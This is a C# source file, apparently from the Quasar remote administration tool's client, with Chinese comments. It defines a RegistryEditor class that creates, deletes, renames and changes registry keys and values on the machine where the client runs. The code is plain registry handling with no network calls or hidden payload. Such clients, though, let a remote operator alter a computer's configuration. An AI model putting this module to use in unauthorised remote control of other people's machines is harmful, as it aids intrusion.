using Microsoft.Win32;
using Quasar.Client.Extensions;
using Quasar.Client.Helper;
using Quasar.Common.Models;
using System;

namespace Quasar.Client.Registry
{
    public class RegistryEditor
    {
        private const string REGISTRY_KEY_CREATE_ERROR = "Cannot create key: Error writing to the registry";

        private const string REGISTRY_KEY_DELETE_ERROR = "Cannot delete key: Error writing to the registry";

        private const string REGISTRY_KEY_RENAME_ERROR = "Cannot rename key: Error writing to the registry";

        private const string REGISTRY_VALUE_CREATE_ERROR = "Cannot create value: Error writing to the registry";

        private const string REGISTRY_VALUE_DELETE_ERROR = "Cannot delete value: Error writing to the registry";

        private const string REGISTRY_VALUE_RENAME_ERROR = "Cannot rename value: Error writing to the registry";

        private const string REGISTRY_VALUE_CHANGE_ERROR = "Cannot change value: Error writing to the registry";

        /// <summary>
        /// 试图为指定的父类创建所需的子键。
        /// </summary>
        /// <param name="parentPath">为其创建子键的父键的路径。</param>
        /// <param name="name">输出参数，持有被创建的子键的名称。</param>
        /// <param name="errorMsg">输出参数，包含可能的错误信息。</param>
        /// <returns>如果行动成功，返回true。</returns>
        public static bool CreateRegistryKey(string parentPath, out string name, out string errorMsg)
        {
            name = "";
            try
            {
                RegistryKey parent = GetWritableRegistryKey(parentPath);


                //无效的不能打开的父类
                if (parent == null)
                {
                    errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
                    return false;
                }

                //尝试找到可用的名字
                int i = 1;
                string testName = String.Format("New Key #{0}", i);

                while (parent.ContainsSubKey(testName))
                {
                    i++;
                    testName = String.Format("New Key #{0}", i);
                }
                name = testName;

                using (RegistryKey child = parent.CreateSubKeySafe(name))
                {
                    //子类不能被创建
                    if (child == null)
                    {
                        errorMsg = REGISTRY_KEY_CREATE_ERROR;
                        return false;
                    }
                }

                //子类被成功创建
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }

        }

        /// <summary>
        /// 试图从指定的父键中删除所需的子键。
        /// </summary>
        /// <param name="name">要删除的子键的名称。</param>
        /// <param name="parentPath">要删除子键的父键的路径。</param>
        /// <param name="errorMsg">输出参数，包含可能的错误信息。</param>
        /// <returns>如果操作成功，返回true。</returns>
        public static bool DeleteRegistryKey(string name, string parentPath, out string errorMsg)
        {
            try
            {
                RegistryKey parent = GetWritableRegistryKey(parentPath);

                //无效的不能打开的父类
                if (parent == null)
                {
                    errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
                    return false;
                }

                //子类不存在
                if (!parent.ContainsSubKey(name))
                {
                    errorMsg = "The registry: " + name + " does not exist in: " + parentPath;
                    //如果子类不存在，那么行为就已经成功了。
                    return true;
                }

                bool success = parent.DeleteSubKeyTreeSafe(name);

                //子类不能被删除
                if (!success)
                {
                    errorMsg = REGISTRY_KEY_DELETE_ERROR;
                    return false;
                }

                //子类被成功删除
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        /// <summary>
        /// 试图重新命名所需的键。
        /// </summary>
        /// <param name="oldName">要重命名的键的名称。</param>
        /// <param name="newName">重命名时使用的名称。</param>
        /// <param name="parentPath">要重命名的键的父类路径。</param>
        /// <param name="errorMsg">输出参数，包含可能的错误信息。</param>
        /// <returns>Returns true if the operation succeeded.</returns>
        public static bool RenameRegistryKey(string oldName, string newName, string parentPath, out string errorMsg)
        {
            try
            {

                RegistryKey parent = GetWritableRegistryKey(parentPath);

                //无效的不能打开的父类
                if (parent == null)
                {
                    errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
                    return false;
                }

                //子类不存在
                if (!parent.ContainsSubKey(oldName))
                {
                    errorMsg = "The registry: " + oldName + " does not exist in: " + parentPath;
                    return false;
                }

                bool success = parent.RenameSubKeySafe(oldName, newName);

                //子类不能被重命名
                if (!success)
                {
                    errorMsg = REGISTRY_KEY_RENAME_ERROR;
                    return false;
                }

                //子类成功被重命名
                errorMsg = "";
                return true;

            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        /// <summary>
        /// 试图为指定的父类创建所需的值。
        /// </summary>
        /// <param name="keyPath">要创建注册表值的键的路径。</param>
        /// <param name="kind">要创建的注册表值的类型。</param>
        /// <param name="name">输出参数，持有创建的注册表值的名称。</param>
        /// <param name="errorMsg">输出参数，包含可能的错误信息。</param>
        /// <returns>如果操作成功，返回true。</returns>
        public static bool CreateRegistryValue(string keyPath, RegistryValueKind kind, out string name, out string errorMsg)
        {
            name = "";
            try
            {
                RegistryKey key = GetWritableRegistryKey(keyPath);

                //无效的不能打开的键
                if (key == null)
                {
                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                    return false;
                }

                //尝试找到可用的名字
                int i = 1;
                string testName = String.Format("New Value #{0}", i);

                while (key.ContainsValue(testName))
                {
                    i++;
                    testName = String.Format("New Value #{0}", i);
                }
                name = testName;

                bool success = key.SetValueSafe(name, kind.GetDefault(), kind);

                //值不能被创造
                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_CREATE_ERROR;
                    return false;
                }

                //值已成功创建
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }

        }

        /// <summary>
        /// 试图从指定的键中删除所需的注册表值。
        /// </summary>
        /// <param name="keyPath">要删除注册表值的键的路径。</param>
        /// /// <param name="name">要删除的注册表值的名称。</param>
        /// <param name="errorMsg">输出参数，包含可能的错误信息。</param>
        /// <returns>如果操作成功，返回true。</returns>
        public static bool DeleteRegistryValue(string keyPath, string name, out string errorMsg)
        {
            try
            {
                RegistryKey key = GetWritableRegistryKey(keyPath);

                //无效的不能打开的键
                if (key == null)
                {
                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                    return false;
                }

                //值不存在
                if (!key.ContainsValue(name))
                {
                    errorMsg = "The value: " + name + " does not exist in: " + keyPath;
                    //如果值不存在，那么行动就已经成功了。
                    return true;
                }

                bool success = key.DeleteValueSafe(name);

                //数值不能被删除
                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_DELETE_ERROR;
                    return false;
                }

                //值被成功删除
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        /// <summary>
        /// 试图重新命名所需的注册表值。
        /// </summary>
        /// <param name="oldName">要重命名的注册表值的名称。</param>
        /// <param name="newName">重命名时使用的名称。</param>
        /// <param name="keyPath">要重命名注册表值的键的路径。</param>
        /// <param name="errorMsg">输出参数，包含可能的错误信息。</param>
        /// <returns>如果操作成功，返回true。</returns>
        public static bool RenameRegistryValue(string oldName, string newName, string keyPath, out string errorMsg)
        {
            try
            {
                RegistryKey key = GetWritableRegistryKey(keyPath);

                //无效的不能打开的键
                if (key == null)
                {
                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                    return false;
                }

                //价值不存在
                if (!key.ContainsValue(oldName))
                {
                    errorMsg = "The value: " + oldName + " does not exist in: " + keyPath;
                    return false;
                }

                bool success = key.RenameValueSafe(oldName, newName);

                //值无法重命名
                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_RENAME_ERROR;
                    return false;
                }

                //值被成功重命名
                errorMsg = "";
                return true;

            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        /// <summary>
        /// 试图为指定的键改变所需的注册表值。
        /// </summary>
        /// <param name="value">要改变的注册表值，其形式为 RegValueData对象。</param>
        /// <param name="keyPath">要改变注册表值的键的路径。</param>
        /// <param name="errorMsg">输出参数，包含可能的错误信息。</param>
        /// <returns>如果操作成功，返回true。</returns>
        public static bool ChangeRegistryValue(RegValueData value, string keyPath, out string errorMsg)
        {
            try
            {
                RegistryKey key = GetWritableRegistryKey(keyPath);

                //无效的不能打开的键
                if (key == null)
                {
                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                    return false;
                }
                
                //不是默认值，也不存在
                if (!RegistryKeyHelper.IsDefaultValue(value.Name) && !key.ContainsValue(value.Name))
                {
                    errorMsg = "The value: " + value.Name + " does not exist in: " + keyPath;
                    return false;
                }

                bool success = key.SetValueSafe(value.Name, value.Data, value.Kind);

                //值无法创建
                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_CHANGE_ERROR;
                    return false;
                }

                //值已成功创建
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }

        }

        public static RegistryKey GetWritableRegistryKey(string keyPath)
        {
            RegistryKey key = RegistrySeeker.GetRootKey(keyPath);

            if (key != null)
            {
                //检查这是否是一个根键
                if (key.Name != keyPath)
                {
                    //必须通过删除根和'\\'来获得子键名称
                    string subKeyName = keyPath.Substring(key.Name.Length + 1);

                    key = key.OpenWritableSubKeySafe(subKeyName);
                }
            }

            return key;
        }
    }
}
